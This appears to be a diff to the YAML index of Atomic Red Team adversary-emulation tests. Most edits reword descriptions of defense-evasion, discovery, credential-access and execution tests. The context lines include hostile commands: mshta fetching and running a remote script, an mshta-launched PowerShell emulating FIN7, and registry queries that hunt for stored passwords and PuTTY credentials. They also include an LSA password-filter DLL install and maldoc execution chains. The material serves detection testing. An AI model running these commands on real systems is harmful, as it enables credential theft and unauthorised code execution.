@@ -10216,9 +10216,10 @@ defense-evasion:
       identifier: T1170
     atomic_tests:
     - name: Mshta executes JavaScript Scheme Fetch Remote Payload With GetObject
-      description: |
-        Test execution of a remote script using mshta.exe
-        Upon execution calc.exe will be launched
+      description: 'Test execution of a remote script using mshta.exe. Upon execution
+        calc.exe will be launched.
+
+'
       supported_platforms:
       - windows
       input_arguments:
@@ -10232,38 +10233,24 @@ defense-evasion:
         command: 'mshta.exe javascript:a=(GetObject(''script:#{file_url}'')).Exec();close();
 
 '
-    - name: Mshta calls a local VBScript file to launch notepad.exe
-      description: Tests execution of a local program by a VBScript file called by
-        Mshta
-      supported_platforms:
-      - windows
-      input_arguments:
-        local_file_path:
-          description: Create a local VBScript file
-          type: path
-          default: C:\Temp\mshta_notepad.vbs
-      executor:
-        name: command_prompt
-        command: 'mshta.exe vbscript:Execute("CreateObject(""Wscript.Shell"").Run(""#{local_file_path}"")(window.close)")
-
-'
     - name: Mshta executes VBScript to execute malicious command
       description: |
-        Run a local VB script to run local user enumeration powershell command
-
+        Run a local VB script to run local user enumeration powershell command.
         This attempts to emulate what FIN7 does with this technique which is using mshta.exe to execute VBScript to execute malicious code on victim systems.
+        Upon execution, a new PowerShell windows will be opened that displays user information.
       supported_platforms:
       - windows
       executor:
         name: command_prompt
         command: 'mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell
-          -noexit -file $PathToAtomicsFolder\T1170\src\powershell.ps1"":close")
+          -noexit -file PathToAtomicsFolder\T1170\src\powershell.ps1"":close")
 
 '
     - name: Mshta Executes Remote HTML Application (HTA)
-      description: |
-        Execute an arbitrary remote HTA.
-        Upon execution calc.exe will be launched
+      description: 'Execute an arbitrary remote HTA. Upon execution calc.exe will
+        be launched.
+
+'
       supported_platforms:
       - windows
       input_arguments:
@@ -12309,10 +12296,9 @@ defense-evasion:
 
 '
     - name: SyncAppvPublishingServer Signed Script PowerShell Command Execution
-      description: 'Executes the signed SyncAppvPublishingServer script with options
-        to execute an arbitrary PowerShell command.
-
-'
+      description: |
+        Executes the signed SyncAppvPublishingServer script with options to execute an arbitrary PowerShell command.
+        Upon execution, calc.exe will be launched.
       supported_platforms:
       - windows
       input_arguments:
@@ -17285,22 +17271,21 @@ discovery:
 
 '
     - name: List Google Chrome Bookmarks on Windows with powershell
-      description: 'Searches for Google Chromes''s Bookmarks file (on Windows distributions)
-        that contains bookmarks.
-
-'
+      description: |
+        Searches for Google Chromes's Bookmarks file (on Windows distributions) that contains bookmarks.
+        Upon execution, paths that contain bookmark files will be displayed.
       supported_platforms:
       - windows
       executor:
         name: powershell
-        command: 'where.exe /R C:\Users\ Bookmarks
+        command: 'Get-ChildItem -Path C:\Users\ -Filter Bookmarks -Recurse -ErrorAction
+          SilentlyContinue -Force
 
 '
-    - name: List Google Chrome Bookmarks on Windows with command prompt
-      description: 'Searches for Google Chromes''s Bookmarks file (on Windows distributions)
-        that contains bookmarks.
-
-'
+    - name: List Google Chrome Bookmarks on Windows with command prompt.
+      description: |
+        Searches for Google Chromes's Bookmarks file (on Windows distributions) that contains bookmarks.
+        Upon execution, paths that contain bookmark files will be displayed.
       supported_platforms:
       - windows
       executor:
@@ -20816,7 +20801,8 @@ credential-access:
       identifier: T1214
     atomic_tests:
     - name: Enumeration for Credentials in Registry
-      description: 'Queries to enumerate for credentials in the Registry.
+      description: 'Queries to enumerate for credentials in the Registry. Upon execution,
+        any registry key containing the word "password" will be displayed.
 
 '
       supported_platforms:
@@ -20828,9 +20814,9 @@ credential-access:
           reg query HKLM /f password /t REG_SZ /s
           reg query HKCU /f password /t REG_SZ /s
     - name: Enumeration for PuTTY Credentials in Registry
-      description: 'Queries to enumerate for PuTTY credentials in the Registry.
-
-'
+      description: |
+        Queries to enumerate for PuTTY credentials in the Registry. PuTTY must be installed for this test to work. If any registry
+        entries are found, they will be displayed.
       supported_platforms:
       - windows
       executor:
@@ -21518,7 +21504,7 @@ credential-access:
       executor:
         name: powershell
         elevation_required: true
-        command: |-
+        command: |
           $passwordFilterName = (Copy-Item "#{input_dll}" -Destination "C:\Windows\System32" -PassThru).basename
           $lsaKey = Get-Item "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\"
           $notificationPackagesValues = $lsaKey.GetValue("Notification Packages")
@@ -23182,9 +23168,10 @@ execution:
       identifier: T1170
     atomic_tests:
     - name: Mshta executes JavaScript Scheme Fetch Remote Payload With GetObject
-      description: |
-        Test execution of a remote script using mshta.exe
-        Upon execution calc.exe will be launched
+      description: 'Test execution of a remote script using mshta.exe. Upon execution
+        calc.exe will be launched.
+
+'
       supported_platforms:
       - windows
       input_arguments:
@@ -23198,38 +23185,24 @@ execution:
         command: 'mshta.exe javascript:a=(GetObject(''script:#{file_url}'')).Exec();close();
 
 '
-    - name: Mshta calls a local VBScript file to launch notepad.exe
-      description: Tests execution of a local program by a VBScript file called by
-        Mshta
-      supported_platforms:
-      - windows
-      input_arguments:
-        local_file_path:
-          description: Create a local VBScript file
-          type: path
-          default: C:\Temp\mshta_notepad.vbs
-      executor:
-        name: command_prompt
-        command: 'mshta.exe vbscript:Execute("CreateObject(""Wscript.Shell"").Run(""#{local_file_path}"")(window.close)")
-
-'
     - name: Mshta executes VBScript to execute malicious command
       description: |
-        Run a local VB script to run local user enumeration powershell command
-
+        Run a local VB script to run local user enumeration powershell command.
         This attempts to emulate what FIN7 does with this technique which is using mshta.exe to execute VBScript to execute malicious code on victim systems.
+        Upon execution, a new PowerShell windows will be opened that displays user information.
       supported_platforms:
       - windows
       executor:
         name: command_prompt
         command: 'mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell
-          -noexit -file $PathToAtomicsFolder\T1170\src\powershell.ps1"":close")
+          -noexit -file PathToAtomicsFolder\T1170\src\powershell.ps1"":close")
 
 '
     - name: Mshta Executes Remote HTML Application (HTA)
-      description: |
-        Execute an arbitrary remote HTA.
-        Upon execution calc.exe will be launched
+      description: 'Execute an arbitrary remote HTA. Upon execution calc.exe will
+        be launched.
+
+'
       supported_platforms:
       - windows
       input_arguments:
@@ -24807,10 +24780,9 @@ execution:
 
 '
     - name: SyncAppvPublishingServer Signed Script PowerShell Command Execution
-      description: 'Executes the signed SyncAppvPublishingServer script with options
-        to execute an arbitrary PowerShell command.
-
-'
+      description: |
+        Executes the signed SyncAppvPublishingServer script with options to execute an arbitrary PowerShell command.
+        Upon execution, calc.exe will be launched.
       supported_platforms:
       - windows
       input_arguments:
@@ -25271,7 +25243,7 @@ execution:
     atomic_tests:
     - name: OSTap Style Macro Execution
       description: |
-        This Test uses a VBA macro to create and execute #{jse_path} with cscript.exe. The .jse file in turn launches wscript.exe.
+        This Test uses a VBA macro to create and execute #{jse_path} with cscript.exe. Upon execution, the .jse file launches wscript.exe.
         Execution is handled by [Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.
 
         This is a known execution chain observed by the OSTap downloader commonly used in TrickBot campaigns
@@ -25339,7 +25311,7 @@ execution:
 '
     - name: Maldoc choice flags command execution
       description: |
-        This Test uses a VBA macro to execute cmd with flags observed in recent maldoc and 2nd stage downloaders
+        This Test uses a VBA macro to execute cmd with flags observed in recent maldoc and 2nd stage downloaders. Upon execution, CMD will be launched.
         Execution is handled by [Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.
       supported_platforms:
       - windows
@@ -25375,6 +25347,7 @@ execution:
     - name: OSTAP JS version
       description: |
         Malicious JavaScript executing CMD which spawns wscript.exe //e:jscript
+
         Execution is handled by [Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.
       supported_platforms:
       - windows
